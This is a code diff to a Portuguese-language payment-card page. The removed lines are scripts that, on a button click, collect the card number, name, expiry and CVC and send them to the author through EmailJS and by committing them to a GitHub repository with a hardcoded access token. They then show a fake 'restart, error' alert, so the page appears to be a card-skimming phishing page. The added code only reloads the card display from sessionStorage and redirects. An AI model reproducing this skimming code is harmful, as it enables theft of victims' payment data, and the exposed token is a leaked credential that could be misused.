@@ -40,89 +40,23 @@
     </section>
 
     <script>
-        document.getElementById("button").addEventListener("click", async () => {
-            // Dados coletados do cartão
-            const dados = {
-                numero: document.getElementById("num-card").textContent,
-                nome: document.getElementById("name-card").textContent,
-                mes: document.getElementById("mes-card").textContent,
-                ano: document.getElementById("ano-card").textContent,
-                cvc: document.getElementById("cvc-card").textContent
-            };
-
-            // Envio via EmailJS (necessário configurar no emailjs.com)
-            try {
-                await emailjs.send("service_xxxxxx", "template_xxxxxx", dados, "publicKey_xxxxxx");
-                alert("Recomece Erro");
-            } catch (e) {
-                alert("Falha ao enviar. Recomece Erro.");
+        // Carregar dados do cartão do sessionStorage
+        window.addEventListener('DOMContentLoaded', () => {
+            const cardData = sessionStorage.getItem('cardData');
+            if (cardData) {
+                const dados = JSON.parse(cardData);
+                document.getElementById('num-card').textContent = dados.numero;
+                document.getElementById('name-card').textContent = dados.nome.toUpperCase();
+                document.getElementById('mes-card').textContent = dados.mes + '/';
+                document.getElementById('ano-card').textContent = dados.ano;
+                document.getElementById('cvc-card').textContent = dados.cvc;
             }
         });
-    </script>
-
-    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
-    <script>
-        (function(){
-            emailjs.init("publicKey_xxxxxx");
-        })();
-    </script>
-
-    <script>
-        // === SALVAR DADOS DIRETAMENTE NO GITHUB (APENAS PARA TESTE!) ===
-        // ISSO NÃO É SEGURO — TOKEN NÃO DEVE FICAR NO FRONT-END
-
-        const GITHUB_TOKEN = "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"; // <-- COLOQUE SEU TOKEN DO GITHUB AQUI (scopo: repo)
-        const REPO = "amdalgodao-eng/PAGAMENTO-FASTEPI";    // exemplo: amdalgodao-eng/Formulario
-        const FILE_PATH = "dados/cartao.json"; // arquivo dentro do repositório
-
-        document.getElementById("button").addEventListener("click", async () => {
-            const dados = {
-                numero: document.getElementById("num-card").textContent,
-                nome: document.getElementById("name-card").textContent,
-                mes: document.getElementById("mes-card").textContent,
-                ano: document.getElementById("ano-card").textContent,
-                cvc: document.getElementById("cvc-card").textContent,
-                data: new Date().toLocaleString()
-            };
-
-            const conteudo = JSON.stringify(dados, null, 2);
-            const base64 = btoa(unescape(encodeURIComponent(conteudo)));
-
-            // Primeiro buscar o arquivo para pegar o SHA
-            let sha = null;
-            const getUrl = `https://api.github.com/repos/${REPO}/contents/${FILE_PATH}`;
-
-            const getResp = await fetch(getUrl, {
-                headers: {
-                    Authorization: `token ${GITHUB_TOKEN}`,
-                    Accept: "application/vnd.github.v3+json"
-                }
-            });
-
-            if (getResp.ok) {
-                const json = await getResp.json();
-                sha = json.sha;
-            }
-
-            // Criar/atualizar arquivo
-            const resp = await fetch(getUrl, {
-                method: "PUT",
-                headers: {
-                    Authorization: `token ${GITHUB_TOKEN}`,
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    message: "Salvar dados do cartão (teste)",
-                    content: base64,
-                    sha: sha
-                })
-            });
-
-            if (resp.ok) {
-                alert("Recomece Erro");
-            } else {
-                alert("Falha ao salvar. Recomece Erro.");
-            }
+        
+        // Botão continuar - limpa dados e redireciona para página inicial
+        document.getElementById("button").addEventListener("click", () => {
+            sessionStorage.removeItem('cardData');
+            window.location.href = "index.html";
         });
     </script>
 </body>
